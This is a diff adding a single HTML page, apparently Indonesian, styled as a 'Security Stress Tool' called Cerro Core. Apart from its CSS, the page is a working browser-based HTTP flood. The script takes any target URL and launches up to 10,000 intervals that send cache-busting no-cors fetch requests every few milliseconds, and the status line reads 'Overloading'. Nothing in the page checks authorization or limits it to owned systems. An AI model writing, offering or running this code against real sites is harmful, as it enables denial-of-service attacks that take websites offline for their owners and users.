@@ -1,0 +1,306 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CERRO CORE | Security Stress Tool</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
+
+        :root {
+            --bg-color: #050505;
+            --panel-bg: #0c0c0c;
+            --accent: #ffffff;
+            --dim: #444444;
+            --glow: rgba(255, 255, 255, 0.15);
+            --danger: #ff1111;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            perspective: 1000px;
+        }
+
+        /* --- Animations --- */
+        @keyframes panelEntry {
+            from { opacity: 0; transform: rotateX(-10deg) translateY(50px) scale(0.9); filter: blur(20px); }
+            to { opacity: 1; transform: rotateX(0deg) translateY(0) scale(1); filter: blur(0px); }
+        }
+
+        @keyframes scanline {
+            0% { top: -10%; }
+            100% { top: 110%; }
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 20px rgba(255,255,255,0.05); }
+            50% { box-shadow: 0 0 40px rgba(255,255,255,0.15); }
+            100% { box-shadow: 0 0 20px rgba(255,255,255,0.05); }
+        }
+
+        @keyframes shake {
+            0% { transform: translate(1px, 1px); }
+            20% { transform: translate(-1px, -1px); }
+            40% { transform: translate(1px, -1px); }
+            60% { transform: translate(-1px, 1px); }
+            100% { transform: translate(0, 0); }
+        }
+
+        /* --- UI Elements --- */
+        .panel {
+            width: 400px;
+            background: var(--panel-bg);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 28px;
+            padding: 35px;
+            position: relative;
+            overflow: hidden;
+            animation: panelEntry 1s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+        }
+
+        .panel.running {
+            animation: shake 0.15s infinite;
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .panel::before {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(to bottom, transparent, var(--glow), transparent);
+            left: 0;
+            animation: scanline 3s linear infinite;
+            z-index: 5;
+            pointer-events: none;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 1.6rem;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            font-weight: 700;
+            color: var(--accent);
+            text-shadow: 0 0 10px rgba(255,255,255,0.3);
+        }
+
+        .status-dot {
+            font-size: 0.65rem;
+            letter-spacing: 2px;
+            color: var(--dim);
+            margin-top: 8px;
+            display: block;
+            text-transform: uppercase;
+        }
+
+        .status-dot.active {
+            color: #fff;
+            text-shadow: 0 0 10px #fff;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            font-size: 0.6rem;
+            color: var(--dim);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        input, select {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 14px;
+            border-radius: 12px;
+            color: #fff;
+            outline: none;
+            transition: 0.3s;
+            font-size: 0.9rem;
+        }
+
+        input:focus {
+            border-color: rgba(255,255,255,0.3);
+            background: rgba(255,255,255,0.06);
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .stat-card {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.03);
+            padding: 15px;
+            border-radius: 15px;
+            text-align: center;
+        }
+
+        .stat-card div:first-child {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--accent);
+        }
+
+        .stat-card div:last-child {
+            font-size: 0.55rem;
+            color: var(--dim);
+            text-transform: uppercase;
+            margin-top: 5px;
+        }
+
+        .btn-launch {
+            width: 100%;
+            padding: 18px;
+            background: var(--accent);
+            color: #000;
+            border: none;
+            border-radius: 15px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-top: 25px;
+            cursor: pointer;
+            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .btn-launch:active {
+            transform: scale(0.95);
+        }
+
+        .btn-launch.stop {
+            background: var(--danger);
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="panel" id="panel">
+        <div class="header">
+            <h1>Cerro Core</h1>
+            <span class="status-dot" id="status">● System Standby</span>
+        </div>
+
+        <div class="input-group">
+            <label>Target Endpoint</label>
+            <input type="text" id="target" placeholder="https://web-kamu.com">
+        </div>
+
+        <div class="input-group">
+            <label>Load Method</label>
+            <select id="method">
+                <option value="flood">HTTP Get Flood</option>
+                <option value="bypass">Cache Bypass</option>
+                <option value="stress">High Intensity</option>
+            </select>
+        </div>
+
+        <div class="input-group">
+            <label>Threads: <span id="threadVal">20</span></label>
+            <input type="range" id="threads" min="1" max="10000" value="20" style="padding:0;">
+        </div>
+
+        <div class="stats">
+            <div class="stat-card">
+                <div id="count">0</div>
+                <div>Requests</div>
+            </div>
+            <div class="stat-card">
+                <div id="rps">0</div>
+                <div>Req / Sec</div>
+            </div>
+        </div>
+
+        <button class="btn-launch" id="launch">Initialize</button>
+    </div>
+
+    <script>
+        const btn = document.getElementById('launch');
+        const panel = document.getElementById('panel');
+        const status = document.getElementById('status');
+        const countDisp = document.getElementById('count');
+        const rpsDisp = document.getElementById('rps');
+        const threadsInput = document.getElementById('threads');
+        const threadVal = document.getElementById('threadVal');
+
+        let active = false;
+        let total = 0;
+        let rpsCounter = 0;
+        let tasks = [];
+
+        threadsInput.oninput = () => threadVal.innerText = threadsInput.value;
+
+        btn.onclick = () => {
+            if(!active) {
+                const url = document.getElementById('target').value;
+                if(!url) return alert("Masukan URL target!");
+                
+                active = true;
+                btn.innerText = "Terminate";
+                btn.classList.add('stop');
+                panel.classList.add('running');
+                status.innerText = "● System Active - Overloading";
+                status.classList.add('active');
+
+                const threadCount = parseInt(threadsInput.value);
+                
+                for(let i = 0; i < threadCount; i++) {
+                    const task = setInterval(() => {
+                        fetch(url + "?nocache=" + Math.random(), { mode: 'no-cors' }).catch(() => {});
+                        total++;
+                        rpsCounter++;
+                        countDisp.innerText = total.toLocaleString();
+                    }, Math.random() * 50 + 20);
+                    tasks.push(task);
+                }
+
+                this.rpsInterval = setInterval(() => {
+                    rpsDisp.innerText = rpsCounter;
+                    rpsCounter = 0;
+                }, 1000);
+
+            } else {
+                active = false;
+                tasks.forEach(clearInterval);
+                clearInterval(this.rpsInterval);
+                tasks = [];
+                
+                btn.innerText = "Initialize";
+                btn.classList.remove('stop');
+                panel.classList.remove('running');
+                status.innerText = "● System Standby";
+                status.classList.remove('active');
+                rpsDisp.innerText = "0";
+            }
+        };
+    </script>
+</body>
+</html>
